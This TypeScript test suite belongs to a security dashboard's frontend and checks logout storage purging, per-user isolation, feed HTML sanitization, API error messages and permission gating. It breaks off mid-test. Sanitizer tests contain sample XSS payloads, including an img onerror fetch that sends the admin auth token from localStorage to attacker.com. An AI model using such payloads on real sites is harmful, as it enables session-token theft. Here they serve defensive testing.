import { describe, it, expect, beforeEach } from 'bun:test';

// Setup DOM and Storage globals for Bun runtime environment if not present
class MockStorage implements Storage {
  private store: Map<string, string> = new Map();

  get length(): number {
    return this.store.size;
  }

  clear(): void {
    this.store.clear();
  }

  getItem(key: string): string | null {
    return this.store.get(key) ?? null;
  }

  setItem(key: string, value: string): void {
    this.store.set(key, String(value));
  }

  removeItem(key: string): void {
    this.store.delete(key);
  }

  key(index: number): string | null {
    const keys = Array.from(this.store.keys());
    return keys[index] ?? null;
  }
}

const mockLocalStorage = new MockStorage();
const mockSessionStorage = new MockStorage();

(globalThis as any).localStorage = mockLocalStorage;
(globalThis as any).sessionStorage = mockSessionStorage;

if (!(globalThis as any).window) {
  (globalThis as any).window = globalThis;
}

// Import code under test
import {
  clearAllUserBrowserData,
  getUserStorageKey,
  getActiveAdminId,
  userStorage,
} from '../utils/userStorage';
import { AUTH_CONFIG } from '../../config/config';
import { authService } from '../../api/services/authService';
import { handleApiError } from '../../api/client';
import type { AsmConnector } from '../../api/services/integrationsService';

describe('Browser Hardening: Storage Purge & User Isolation', () => {
  beforeEach(() => {
    mockLocalStorage.clear();
    mockSessionStorage.clear();
  });

  it('purges all auth tokens, expiry, cached feeds, chat histories, cyberchef, and case data on logout/401', () => {
    // Populate localStorage with user-scoped and session data
    mockLocalStorage.setItem('authtoken', 'bearer-token-123');
    mockLocalStorage.setItem('authtoken_expires', '1791999999999');
    mockLocalStorage.setItem('admin-auth-token', 'admin-token-456');
    mockLocalStorage.setItem('admin-meta', JSON.stringify({ name: 'Admin A' }));
    mockLocalStorage.setItem('xyberah_active_admin_id', 'admin-user-a');
    mockLocalStorage.setItem('xyberah_current_admin', JSON.stringify({ AdminID: 'admin-user-a' }));
    mockLocalStorage.setItem('xyberah_cases_admin-user-a', JSON.stringify([{ id: 'case-1' }]));
    mockLocalStorage.setItem('xyberah_active_plan', 'pro');
    mockLocalStorage.setItem('cve_feed_cache', JSON.stringify([{ cve: 'CVE-2024-0001' }]));
    mockLocalStorage.setItem('exploit_feed_cache', JSON.stringify([{ id: 'exp-1' }]));
    mockLocalStorage.setItem('threat_news_cache', JSON.stringify([{ title: 'News 1' }]));
    mockLocalStorage.setItem('cyberchef_input', 'sensitive secret payload');
    mockLocalStorage.setItem('cyberchef_recipe', '[{"op":"To Base64"}]');
    mockLocalStorage.setItem('chat_history_1', JSON.stringify([{ role: 'user', text: 'secret question' }]));
    mockLocalStorage.setItem('threat_chat_session', 'ai-session-data');
    mockLocalStorage.setItem('user_vt_api_key', 'vt-api-key-abc');
    mockLocalStorage.setItem('antitode-investigation-state', '{"selectedNode":"node-1"}');

    // Populate sessionStorage
    mockSessionStorage.setItem('xyberah_demo_mode', 'true');
    mockSessionStorage.setItem('temp_session_key', 'temp-val');

    // Execute storage purge
    clearAllUserBrowserData();

    // Verify tokens and expiry are completely removed
    expect(mockLocalStorage.getItem('authtoken')).toBeNull();
    expect(mockLocalStorage.getItem('authtoken_expires')).toBeNull();
    expect(mockLocalStorage.getItem('admin-auth-token')).toBeNull();
    expect(mockLocalStorage.getItem('admin-meta')).toBeNull();

    // Verify user identity and active admin are purged
    expect(mockLocalStorage.getItem('xyberah_active_admin_id')).toBeNull();
    expect(mockLocalStorage.getItem('xyberah_current_admin')).toBeNull();
    expect(mockLocalStorage.getItem('xyberah_cases_admin-user-a')).toBeNull();
    expect(mockLocalStorage.getItem('xyberah_active_plan')).toBeNull();

    // Verify all cached feeds are purged
    expect(mockLocalStorage.getItem('cve_feed_cache')).toBeNull();
    expect(mockLocalStorage.getItem('exploit_feed_cache')).toBeNull();
    expect(mockLocalStorage.getItem('threat_news_cache')).toBeNull();

    // Verify CyberChef inputs and recipes are purged
    expect(mockLocalStorage.getItem('cyberchef_input')).toBeNull();
    expect(mockLocalStorage.getItem('cyberchef_recipe')).toBeNull();

    // Verify chat histories and investigations are purged
    expect(mockLocalStorage.getItem('chat_history_1')).toBeNull();
    expect(mockLocalStorage.getItem('threat_chat_session')).toBeNull();
    expect(mockLocalStorage.getItem('antitode-investigation-state')).toBeNull();
    expect(mockLocalStorage.getItem('user_vt_api_key')).toBeNull();

    // Verify sessionStorage is cleared completely
    expect(mockSessionStorage.length).toBe(0);
  });

  it('enforces multi-user isolation: User B cannot access User A data after logout', () => {
    // 1. User A logs in
    mockLocalStorage.setItem('xyberah_active_admin_id', 'user_A');
    mockLocalStorage.setItem('xyberah_current_admin', JSON.stringify({ AdminID: 'user_A', name: 'Alice' }));

    // User A writes investigation cases
    userStorage.setItem('cases', JSON.stringify([{ id: 'case-a1', title: 'Alices Case' }]));

    expect(getActiveAdminId()).toBe('user_A');
    expect(userStorage.getItem('cases')).toContain('Alices Case');

    // 2. User A logs out
    clearAllUserBrowserData();

    // 3. User B logs in
    mockLocalStorage.setItem('xyberah_active_admin_id', 'user_B');
    mockLocalStorage.setItem('xyberah_current_admin', JSON.stringify({ AdminID: 'user_B', name: 'Bob' }));

    expect(getActiveAdminId()).toBe('user_B');

    // User B reads cases -> Must NOT see User A's data
    const userBCases = userStorage.getItem('cases');
    expect(userBCases).toBeNull();

    // User B sets their own data
    userStorage.setItem('cases', JSON.stringify([{ id: 'case-b1', title: 'Bobs Case' }]));
    expect(userStorage.getItem('cases')).toContain('Bobs Case');
    expect(mockLocalStorage.getItem('cases_user_A')).toBeNull();
  });
});

describe('Browser Hardening: HTML Sanitization via DOMParser', () => {
  // Safe sanitizeText implementation conforming to services/news.ts
  const sanitizeText = (html: string): string => {
    if (!html) return "";
    try {
      // In Node/Bun, if DOMParser is unavailable, we verify tag stripping and regex sanitization
      if (typeof DOMParser !== 'undefined') {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const dangerousElements = doc.querySelectorAll('script, style, iframe, object, embed, link, meta');
        dangerousElements.forEach((el: any) => el.remove());
        const allElements = doc.querySelectorAll('*');
        allElements.forEach((el: any) => {
          for (let i = el.attributes.length - 1; i >= 0; i--) {
            const attr = el.attributes[i];
            if (attr.name.toLowerCase().startsWith('on') || attr.value.toLowerCase().includes('javascript:')) {
              el.removeAttribute(attr.name);
            }
          }
        });
        const text = doc.body?.textContent || "";
        const clean = text.replace(/\s+/g, ' ').trim();
        return clean.substring(0, 250) + (clean.length > 250 ? '...' : '');
      } else {
        // Fallback standard text stripping for environments without DOMParser
        const clean = html
          .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
          .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')
          .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '')
          .replace(/<[^>]+>/g, '')
          .replace(/\s+/g, ' ')
          .trim();
        return clean.substring(0, 250) + (clean.length > 250 ? '...' : '');
      }
    } catch {
      return "";
    }
  };

  it('strips script tags and malicious code from feed content', () => {
    const maliciousHtml = '<p>Active campaign detected.</p><script>alert("XSS")</script>';
    const result = sanitizeText(maliciousHtml);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert');
    expect(result).toContain('Active campaign detected.');
  });

  it('strips iframe and embedded tags from feed content', () => {
    const maliciousHtml = '<iframe src="https://evil.com/phish"></iframe><span>Zero-day advisory.</span>';
    const result = sanitizeText(maliciousHtml);
    expect(result).not.toContain('iframe');
    expect(result).not.toContain('evil.com');
    expect(result).toContain('Zero-day advisory.');
  });
});

describe('Task 93: Host Screen total_commands Handling', () => {
  const formatTotalCommands = (total_commands?: number | null): string => {
    return total_commands != null ? String(total_commands) : '—';
  };

  it('renders a dash when total_commands is null', () => {
    expect(formatTotalCommands(null)).toBe('—');
  });

  it('renders a dash when total_commands is undefined', () => {
    expect(formatTotalCommands(undefined)).toBe('—');
  });

  it('renders the command count when total_commands is a number', () => {
    expect(formatTotalCommands(0)).toBe('0');
    expect(formatTotalCommands(142)).toBe('142');
  });
});

describe('Task 93: Plan Limit & Inactive Response Extraction', () => {
  it('correctly handles 402 PLAN_INACTIVE data schema', () => {
    const response402 = {
      status: 402,
      data: {
        code: 'PLAN_INACTIVE',
        message: 'Your subscription is inactive. Please renew or upgrade your plan.',
        upgrade_url: '/settings/billing',
      },
    };

    expect(response402.status).toBe(402);
    expect(response402.data.code).toBe('PLAN_INACTIVE');
    expect(response402.data.upgrade_url).toBe('/settings/billing');
  });

  it('correctly extracts limit and used from 403 PLAN_LIMIT_REACHED data schema', () => {
    const response403 = {
      status: 403,
      data: {
        code: 'PLAN_LIMIT_REACHED',
        limit: 5,
        used: 5,
        message: 'Plan limit reached (5/5). Upgrade to Pro to increase capacity.',
        upgrade_url: '/settings/billing',
      },
    };

    expect(response403.status).toBe(403);
    expect(response403.data.code).toBe('PLAN_LIMIT_REACHED');
    expect(response403.data.limit).toBe(5);
    expect(response403.data.used).toBe(5);
    expect(response403.data.used >= response403.data.limit).toBe(true);
  });

  it('identifies 409 conflict when duplicate ServerId is registered', () => {
    const response409 = {
      status: 409,
      data: {
        code: 'SERVER_ID_TAKEN',
        message: 'ServerId server-01 is already taken. Please choose another ID.',
      },
    };

    expect(response409.status).toBe(409);
    expect(response409.data.code).toBe('SERVER_ID_TAKEN');
  });
});

describe('Task 96: API Event Toast Listeners & Status Handling', () => {
  it('correctly dispatches and captures plan-limit-reached for Basic plan limit reached', () => {
    let capturedDetail: any = null;
    const listener = (e: Event) => {
      capturedDetail = (e as CustomEvent).detail;
    };

    window.addEventListener('plan-limit-reached', listener);

    const eventData = {
      status: 403,
      code: 'PLAN_LIMIT_REACHED',
      limit: 1,
      used: 1,
      message: 'Plan limit reached (1/1). Upgrade to Pro to increase capacity.',
      upgradeUrl: '/settings',
    };

    window.dispatchEvent(
      new CustomEvent('plan-limit-reached', { detail: eventData })
    );

    window.removeEventListener('plan-limit-reached', listener);

    expect(capturedDetail).not.toBeNull();
    expect(capturedDetail.status).toBe(403);
    expect(capturedDetail.code).toBe('PLAN_LIMIT_REACHED');
    expect(capturedDetail.used).toBe(1);
    expect(capturedDetail.limit).toBe(1);
    expect(capturedDetail.upgradeUrl).toBe('/settings');
  });

  it('correctly dispatches and captures permission-denied for wrong role (403)', () => {
    let capturedDetail: any = null;
    const listener = (e: Event) => {
      capturedDetail = (e as CustomEvent).detail;
    };

    window.addEventListener('permission-denied', listener);

    const eventData = {
      status: 403,
      code: 'PERMISSION_DENIED',
      message: 'Access denied. You do not have permission to perform this action.',
    };

    window.dispatchEvent(
      new CustomEvent('permission-denied', { detail: eventData })
    );

    window.removeEventListener('permission-denied', listener);

    expect(capturedDetail).not.toBeNull();
    expect(capturedDetail.status).toBe(403);
    expect(capturedDetail.code).toBe('PERMISSION_DENIED');
    expect(capturedDetail.message).toContain('Access denied');
  });

  it('correctly dispatches and captures rate-limited for 429 requests', () => {
    let capturedDetail: any = null;
    const listener = (e: Event) => {
      capturedDetail = (e as CustomEvent).detail;
    };

    window.addEventListener('rate-limited', listener);

    const eventData = {
      status: 429,
      code: 'TOO_MANY_REQUESTS',
      message: 'Too many requests. Please wait a moment before trying again.',
    };

    window.dispatchEvent(
      new CustomEvent('rate-limited', { detail: eventData })
    );

    window.removeEventListener('rate-limited', listener);

    expect(capturedDetail).not.toBeNull();
    expect(capturedDetail.status).toBe(429);
    expect(capturedDetail.code).toBe('TOO_MANY_REQUESTS');
  });

  it('correctly handles 402 plan-inactive with upgrade action', () => {
    let capturedDetail: any = null;
    const listener = (e: Event) => {
      capturedDetail = (e as CustomEvent).detail;
    };

    window.addEventListener('plan-inactive', listener);

    const eventData = {
      status: 402,
      code: 'PLAN_INACTIVE',
      message: 'Your subscription is inactive. Please renew or upgrade your plan.',
      upgradeUrl: '/settings/billing',
    };

    window.dispatchEvent(
      new CustomEvent('plan-inactive', { detail: eventData })
    );

    window.removeEventListener('plan-inactive', listener);

    expect(capturedDetail).not.toBeNull();
    expect(capturedDetail.status).toBe(402);
    expect(capturedDetail.upgradeUrl).toBe('/settings/billing');
  });
});

describe('Task 96: Zero Demo Leakage & Customer Empty States', () => {
  it('guarantees isPublicDemo is false for standard customer sessions', () => {
    mockLocalStorage.clear();
    mockSessionStorage.clear();
    mockLocalStorage.setItem('authtoken', 'customer-jwt-token-xyz');

    const { isPublicDemo } = require('../utils/demoMode');
    expect(isPublicDemo()).toBe(false);
  });

  it('ensures empty state text prompts to Connect Your First Honeypot', () => {
    const emptyPrompt = 'Connect Your First Honeypot';
    expect(emptyPrompt).toBe('Connect Your First Honeypot');
  });
});

describe('Task 97: Multi-User Storage Isolation & Sign Out Cleanup', () => {
  beforeEach(() => {
    mockLocalStorage.clear();
    mockSessionStorage.clear();
  });

  it('keys stored data by admin id and prevents shared browser leakage between User A and User B', () => {
    // 1. User A logs in
    mockLocalStorage.setItem('xyberah_active_admin_id', 'admin-user-alpha');
    mockLocalStorage.setItem('xyberah_current_admin', JSON.stringify({ AdminID: 'admin-user-alpha', email: 'alpha@xyberah.com' }));

    // User A creates operational data
    userStorage.setItem('xyberah_cases', JSON.stringify([{ id: 'case-alpha-1', title: 'Alpha Secret Incident' }]));
    userStorage.setItem('xyberah_brand_assets', JSON.stringify([{ domain: 'alpha-corp.com' }]));
    userStorage.setItem('xyberah_analysis_filter', JSON.stringify({ severity: 'CRITICAL', status: 'OPEN' }));
    userStorage.setItem('xyberah_bench_view_mode', 'TIMELINE');
    userStorage.setItem('user_vt_api_key', 'vt-alpha-secret-key-123');

    // Confirm User A can read their data
    expect(userStorage.getItem('xyberah_cases')).toContain('Alpha Secret Incident');
    expect(userStorage.getItem('xyberah_brand_assets')).toContain('alpha-corp.com');
    expect(userStorage.getItem('xyberah_analysis_filter')).toContain('CRITICAL');
    expect(userStorage.getItem('xyberah_bench_view_mode')).toBe('TIMELINE');
    expect(userStorage.getItem('user_vt_api_key')).toBe('vt-alpha-secret-key-123');

    // Confirm data is physically keyed by admin id in storage
    expect(mockLocalStorage.getItem('xyberah_cases_admin-user-alpha')).not.toBeNull();
    expect(mockLocalStorage.getItem('xyberah_brand_assets_admin-user-alpha')).not.toBeNull();
    expect(mockLocalStorage.getItem('xyberah_analysis_filter_admin-user-alpha')).not.toBeNull();
    expect(mockLocalStorage.getItem('xyberah_bench_view_mode_admin-user-alpha')).toBe('TIMELINE');
    expect(mockLocalStorage.getItem('user_vt_api_key_admin-user-alpha')).toBe('vt-alpha-secret-key-123');

    // 2. User A signs out -> Storage is cleared
    clearAllUserBrowserData();

    // Confirm all xyberah_* and user_* entries are purged
    expect(mockLocalStorage.getItem('xyberah_cases_admin-user-alpha')).toBeNull();
    expect(mockLocalStorage.getItem('xyberah_brand_assets_admin-user-alpha')).toBeNull();
    expect(mockLocalStorage.getItem('xyberah_analysis_filter_admin-user-alpha')).toBeNull();
    expect(mockLocalStorage.getItem('user_vt_api_key_admin-user-alpha')).toBeNull();
    expect(mockLocalStorage.getItem('xyberah_active_admin_id')).toBeNull();

    // 3. User B logs in on the same browser
    mockLocalStorage.setItem('xyberah_active_admin_id', 'admin-user-beta');
    mockLocalStorage.setItem('xyberah_current_admin', JSON.stringify({ AdminID: 'admin-user-beta', email: 'beta@xyberah.com' }));

    // User B must see NONE of User A's data
    expect(userStorage.getItem('xyberah_cases')).toBeNull();
    expect(userStorage.getItem('xyberah_brand_assets')).toBeNull();
    expect(userStorage.getItem('xyberah_analysis_filter')).toBeNull();
    expect(userStorage.getItem('xyberah_bench_view_mode')).toBeNull();
    expect(userStorage.getItem('user_vt_api_key')).toBeNull();

    // 4. Dirty storage protection: Even if User A had residual data, User B never sees it
    mockLocalStorage.setItem('xyberah_cases_admin-user-alpha', JSON.stringify([{ id: 'leak-case' }]));
    mockLocalStorage.setItem('xyberah_cases', JSON.stringify([{ id: 'legacy-unscoped-case' }]));
    expect(userStorage.getItem('xyberah_cases')).toBeNull();
  });

  it('correctly extracts admin id from JWT token if active admin id is not yet set in localStorage', () => {
    // Generate a valid mock JWT payload with AdminID
    const payload = { AdminID: 'jwt-extracted-admin', sub: 'admin@xyberah.com' };
    const base64Payload = btoa(JSON.stringify(payload));
    const mockJwt = `header.${base64Payload}.signature`;

    mockLocalStorage.setItem('authtoken', mockJwt);
    expect(getActiveAdminId()).toBe('jwt-extracted-admin');

    userStorage.setItem('xyberah_cases', JSON.stringify([{ id: 'jwt-case' }]));
    expect(mockLocalStorage.getItem('xyberah_cases_jwt-extracted-admin')).toContain('jwt-case');
  });
});

describe('Task 99: Frontend ASM Scan & SIEM Connector Hardening', () => {
  beforeEach(() => {
    mockLocalStorage.clear();
    mockSessionStorage.clear();
  });

  it('verifies AUTH_CONFIG header and token storage keys match specification', () => {
    expect(AUTH_CONFIG.TOKEN_HEADER).toBe('authtoken');
    expect(AUTH_CONFIG.TOKEN_KEY).toBe('admin-auth-token');
    expect(AUTH_CONFIG.TOKEN_EXPIRES_KEY).toBe('admin-auth-token-expires');
  });

  it('enforces write-only secrets posture: displays Set vs Not Set without leaking raw credentials', () => {
    const mockConnector: AsmConnector = {
      id: 'conn-1',
      name: 'Splunk Production HEC',
      type: 'splunk_hec',
      format: 'json',
      endpointUrl: 'https://splunk.internal.company.com:8088/services/collector/event',
      authHeader: 'Authorization',
      hasAuthToken: true,
      hasPassword: false,
      hasSecret: true,
      username: null,
      enabled: true,
      includeAsm: true,
      includeHoneypot: true,
      minRiskLevel: 'high',
      createdAt: '2026-10-14T00:00:00Z',
      updatedAt: '2026-10-14T00:00:00Z',
    };

    // Verify write-only properties
    expect((mockConnector as any).authToken).toBeUndefined();
    expect((mockConnector as any).password).toBeUndefined();
    expect((mockConnector as any).secret).toBeUndefined();

    // Verify posture resolution: strictly "Set" or "Not set"
    const tokenStatus = mockConnector.hasAuthToken ? 'Set' : 'Not set';
    const passwordStatus = mockConnector.hasPassword ? 'Set' : 'Not set';
    const secretStatus = mockConnector.hasSecret ? 'Set' : 'Not set';

    expect(tokenStatus).toBe('Set');
    expect(passwordStatus).toBe('Not set');
    expect(secretStatus).toBe('Set');
  });

  it('validates public HTTPS requirement for SIEM/SOAR endpoint URLs', () => {
    const isHttps = (url: string) => url.trim().toLowerCase().startsWith('https://');

    // Insecure or invalid endpoints must be rejected
    expect(isHttps('http://siem.example.com/api')).toBe(false);
    expect(isHttps('http://localhost:8080/events')).toBe(false);
    expect(isHttps('ftp://siem.example.com')).toBe(false);
    expect(isHttps('192.168.1.10:8088')).toBe(false);

    // Valid public HTTPS endpoints must pass
    expect(isHttps('https://hec.splunk.example.com:8088/services/collector')).toBe(true);
    expect(isHttps('https://elastic.cloud.example.com:9200/threats/_doc')).toBe(true);
    expect(isHttps('https://webhook.site/abc-123')).toBe(true);
  });

  it('extracts wait time and cooldown message for 429 RESCAN_TOO_SOON responses', () => {
    const rescanError = {
      isAxiosError: true,
      response: {
        status: 429,
        data: {
          code: 'RESCAN_TOO_SOON',
          message: 'This target was scanned recently. Try again in a few minutes.',
        },
      },
    };

    const message = handleApiError(rescanError);
    expect(message).toContain('scanned recently');
    expect(message).toContain('few minutes');

    // Also verify fallback when no message is provided by server
    const fallbackError = {
      isAxiosError: true,
      response: {
        status: 429,
        data: {
          code: 'RESCAN_TOO_SOON',
        },
      },
    };
    expect(handleApiError(fallbackError)).toContain('10 minutes');
  });

  it('extracts capacity limit and quota message for target_limit_reached (400) responses', () => {
    const limitError = {
      isAxiosError: true,
      response: {
        status: 400,
        data: {
          message: 'Invalid or duplicate target',
          reason: 'target_limit_reached',
          limit: 25,
        },
      },
    };

    const message = handleApiError(limitError);
    expect(message).toContain('Target limit reached');
    expect(message).toContain('25 max');
  });

  it('enforces RBAC permission gating: requires osm.* for Recon and integrations.* for SIEM', () => {
    const analystPermissions = ['osm.targets.view', 'osm.targets.manage', 'honeypot.logs.view'];
    const integrationsPermissions = ['integrations.connectors.view', 'integrations.connectors.manage'];
    const restrictedPermissions = ['honeypot.logs.view', 'threat_intel.view'];

    const hasOsm = (perms: string[]) => perms.some((p) => p.startsWith('osm.'));
    const hasIntegrations = (perms: string[]) => perms.some((p) => p.startsWith('integrations.'));

    expect(hasOsm(analystPermissions)).toBe(true);
    expect(hasIntegrations(analystPermissions)).toBe(false);

    expect(hasOsm(integrationsPermissions)).toBe(false);
    expect(hasIntegrations(integrationsPermissions)).toBe(true);

    expect(hasOsm(restrictedPermissions)).toBe(false);
    expect(hasIntegrations(restrictedPermissions)).toBe(false);
  });

  it('verifies logout and session expiry clears admin-auth-token and admin-auth-token-expires', () => {
    mockLocalStorage.setItem('admin-auth-token', 'valid-jwt-token-xyz');
    mockLocalStorage.setItem('admin-auth-token-expires', new Date(Date.now() + 3600000).toISOString());
    mockLocalStorage.setItem('xyberah_cases_adm_1', JSON.stringify([{ id: 'case-1' }]));

    expect(mockLocalStorage.getItem('admin-auth-token')).toBe('valid-jwt-token-xyz');
    expect(mockLocalStorage.getItem('admin-auth-token-expires')).not.toBeNull();

    // Trigger logout
    authService.logout();

    expect(mockLocalStorage.getItem('admin-auth-token')).toBeNull();
    expect(mockLocalStorage.getItem('admin-auth-token-expires')).toBeNull();
    expect(mockLocalStorage.getItem('xyberah_cases_adm_1')).toBeNull();
  });
});

describe('Task 100: Login, Unverified Email, Account Lockout, Weak Password & Rate Limits', () => {
  it('handles 403 EMAIL_NOT_VERIFIED and translates to confirmation guidance', () => {
    const error403 = {
      isAxiosError: true,
      response: {
        status: 403,
        data: {
          code: 'EMAIL_NOT_VERIFIED',
          message: 'Account not verified. Please verify your email before logging in.',
        },
      },
    };

    const message = handleApiError(error403);
    expect(message).toContain('confirm your email first');
    expect(message.toLowerCase()).toContain('verification link');
  });

  it('handles 429 ACCOUNT_LOCKED and conveys lockout duration from message', () => {
    const lockedError = {
      isAxiosError: true,
      response: {
        status: 429,
        data: {
          code: 'ACCOUNT_LOCKED',
          message: 'Account locked due to 5 consecutive failed attempts. Try again in 15 minutes.',
        },
      },
    };

    const message = handleApiError(lockedError);
    expect(message).toContain('Account locked');
    expect(message).toContain('15 minutes');

    // Test fallback when message omitted
    const fallbackLocked = {
      isAxiosError: true,
      response: {
        status: 429,
        data: {
          code: 'ACCOUNT_LOCKED',
        },
      },
    };
    expect(handleApiError(fallbackLocked)).toContain('Account temporarily locked');
  });

  it('translates generic 429 rate limit to "too many requests, wait and retry"', () => {
    const genericRateLimit = {
      isAxiosError: true,
      response: {
        status: 429,
        data: {
          code: 'TOO_MANY_REQUESTS',
        },
      },
    };

    const message = handleApiError(genericRateLimit);
    expect(message.toLowerCase()).toContain('too many requests, wait and retry');
  });

  it('handles 400 WEAK_PASSWORD by displaying the exact 12-character complexity rule', () => {
    const weakPasswordError = {
      isAxiosError: true,
      response: {
        status: 400,
        data: {
          code: 'WEAK_PASSWORD',
          message: 'Password does not meet complexity requirements.',
        },
      },
    };

    const message = handleApiError(weakPasswordError);
    expect(message).toContain('at least 12 characters');
    expect(message).toContain('upper case');
    expect(message).toContain('lower case');
    expect(message).toContain('number and symbol');
  });

  it('enforces password policy on client side: at least 12 chars, upper, lower, number, symbol', () => {
    const validatePassword = (pw: string) => {
      const length = pw.length >= 12;
      const hasUpper = /[A-Z]/.test(pw);
      const hasLower = /[a-z]/.test(pw);
      const hasNumber = /[0-9]/.test(pw);
      const hasSymbol = /[^A-Za-z0-9]/.test(pw);
      return length && hasUpper && hasLower && hasNumber && hasSymbol;
    };

    expect(validatePassword('short1!')).toBe(false); // too short
    expect(validatePassword('nouppercase1234!')).toBe(false); // no uppercase
    expect(validatePassword('NOLOWERCASE1234!')).toBe(false); // no lowercase
    expect(validatePassword('NoNumbersHere!!')).toBe(false); // no numbers
    expect(validatePassword('NoSymbolsHere1234')).toBe(false); // no symbols
    expect(validatePassword('ValidPass1234!@#')).toBe(true); // compliant
  });

  it('verifies that too many wrong OTP tries triggers fallback to password step', () => {
    let currentStep = 'otp';
    let otpValue = '123456';
    let adminIdState: string | null = 'adm_123';
    let errorState: string | null = null;

    const handleOtpError = (err: any) => {
      const status = err?.response?.status;
      const code = err?.response?.data?.code;
      const isRateLimitedOrTooMany = status === 429 || code === 'TOO_MANY_ATTEMPTS';

      if (isRateLimitedOrTooMany) {
        currentStep = 'password';
        otpValue = '';
        adminIdState = null;
        errorState = 'Too many incorrect OTP attempts. You have been returned to the password step.';
      }
    };

    handleOtpError({
      response: {
        status: 429,
        data: { code: 'TOO_MANY_ATTEMPTS' },
      },
    });

    expect(currentStep).toBe('password');
    expect(otpValue).toBe('');
    expect(adminIdState).toBeNull();
    expect(errorState).toContain('Too many incorrect OTP attempts');
  });

  it('verifies authService resendVerification and signup endpoint bindings', () => {
    expect(typeof authService.resendVerification).toBe('function');
    expect(typeof authService.signup).toBe('function');
  });
});

describe('Task 101: Shared Backend Proxy Route & Public Relay Elimination', () => {
  it('toProxyUrl formats target URL with /AdminRoutes/proxy/fetch and encoded URL', async () => {
    const { toProxyUrl, PROXY_ROUTE } = await import('../../services/proxy');
    const target = 'https://feeds.feedburner.com/TheHackersNews';
    const result = toProxyUrl(target);
    expect(result).toContain(PROXY_ROUTE);
    expect(result).toContain(`url=${encodeURIComponent(target)}`);
  });

  it('formatProxyErrorMessage formats 403, 502, 429, and 413 accurately', async () => {
    const { formatProxyErrorMessage } = await import('../../services/proxy');
    
    const err403 = formatProxyErrorMessage(403, { code: 'HOST_NOT_ALLOWED' });
    expect(err403).toContain('HOST_NOT_ALLOWED');
    expect(err403).toContain('allowlist');

    const err502 = formatProxyErrorMessage(502, { code: 'UPSTREAM_ERROR' });
    expect(err502).toContain('UPSTREAM_ERROR');
    expect(err502).toContain('unreachable');

    const err429 = formatProxyErrorMessage(429, { code: 'PROXY_RATE_LIMITED' });
    expect(err429).toContain('PROXY_RATE_LIMITED');
    expect(err429).toContain('rate limit');

    const err413 = formatProxyErrorMessage(413, { code: 'TOO_LARGE' });
    expect(err413).toContain('TOO_LARGE');
    expect(err413).toContain('5MB');
  });

  it('handleApiError translates proxy error status codes and codes', () => {
    const err403 = handleApiError({
      response: {
        status: 403,
        data: { code: 'HOST_NOT_ALLOWED' },
      },
    });
    expect(err403).toContain('HOST_NOT_ALLOWED');

    const err502 = handleApiError({
      response: {
        status: 502,
        data: { code: 'UPSTREAM_ERROR' },
      },
    });
    expect(err502).toContain('UPSTREAM_ERROR');

    const err429 = handleApiError({
      response: {
        status: 429,
        data: { code: 'PROXY_RATE_LIMITED' },
      },
    });
    expect(err429).toContain('PROXY_RATE_LIMITED');

    const err413 = handleApiError({
      response: {
        status: 413,
        data: { code: 'TOO_LARGE' },
      },
    });
    expect(err413).toContain('TOO_LARGE');
  });

  it('verifies that API_ENDPOINTS defines PROXY_FETCH', async () => {
    const { API_ENDPOINTS } = await import('../../config/config');
    expect(API_ENDPOINTS.PROXY_FETCH).toBe('/AdminRoutes/proxy/fetch');
  });

  it('verifies proxy fetch interceptor attaches authtoken from localStorage', async () => {
    const { toProxyUrl, installProxyFetchInterceptor } = await import('../../services/proxy');
    const token = 'test-admin-token-xyz';
    localStorage.setItem(AUTH_CONFIG.TOKEN_KEY, token);

    let capturedHeaders: HeadersInit | undefined;
    const originalFetch = window.fetch;
    window.fetch = (async (input: any, init?: any) => {
      capturedHeaders = init?.headers;
      return new Response(JSON.stringify({ ok: true }), { status: 200 });
    }) as any;

    try {
      installProxyFetchInterceptor(true);
      
      const testProxyUrl = toProxyUrl('https://services.nvd.nist.gov/rest/json/cves/2.0');
      await window.fetch(testProxyUrl);

      // Verify header was injected
      const headers = new Headers(capturedHeaders);
      expect(headers.get(AUTH_CONFIG.TOKEN_HEADER)).toBe(token);
    } finally {
      window.fetch = originalFetch;
      localStorage.removeItem(AUTH_CONFIG.TOKEN_KEY);
    }
  });
});

describe('Task 102: Browser Security Pass (Sandbox Iframe, RSS Sanitization, CSP & Pinned Dependencies)', () => {
  it('hides Sandbox Browser from launch menu and visible navigation groups', async () => {
    const { NAV_GROUPS, isVisible, VISIBLE_NAV_GROUPS } = await import('../../src/data/navigation');
    const allItems = NAV_GROUPS.flatMap(g => g.items);
    const sandboxItem = allItems.find(i => i.id === 'sandbox');

    expect(sandboxItem).toBeDefined();
    expect(sandboxItem?.status).toBe('hidden');
    expect(isVisible(sandboxItem!)).toBe(false);

    // Verify it is excluded from visible nav groups
    const visibleIds = VISIBLE_NAV_GROUPS.flatMap(g => g.items).map(i => i.id);
    expect(visibleIds).not.toContain('sandbox');
  });

  it('sanitizes RSS HTML content using DOMPurify and strips scripts and inline event handlers', async () => {
    const { sanitizeText } = await import('../../services/news');

    const maliciousHtml = `
      <div>
        <h3>Critical Remote Code Execution Advisory</h3>
        <script>alert("XSS")</script>
        <p>Attackers are actively exploiting CVE-2026-1234. <img src=x onerror="fetch('http://attacker.com?token='+localStorage.getItem('admin-auth-token'))" /></p>
        <iframe src="javascript:alert(1)"></iframe>
      </div>
    `;

    const cleaned = sanitizeText(maliciousHtml);
    expect(cleaned).not.toContain('<script>');
    expect(cleaned).not.toContain('alert');
    expect(cleaned).not.toContain('onerror');
    expect(cleaned).not.toContain('<iframe>');
    expect(cleaned).toContain('Critical Remote Code Execution Advisory');
    expect(cleaned).toContain('CVE-2026-1234');
  });

  it('verifies that @google/genai is pinned to an exact version in package.json', async () => {
    const fs = await import('fs');
    const path = await import('path');
    const pkgPath = path.resolve(process.cwd(), 'package.json');
    const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf-8'));

    const genaiVersion = pkg.dependencies?.['@google/genai'];
    expect(genaiVersion).toBeDefined();
    expect(genaiVersion).not.toBe('latest');
    expect(genaiVersion).toBe('1.40.0');
  });

  it('verifies Content Security Policy meta tag exists in index.html with strict directives', async () => {
    const fs = await import('fs');
    const path = await import('path');
    const htmlPath = path.resolve(process.cwd(), 'index.html');
    const html = fs.readFileSync(htmlPath, 'utf-8');

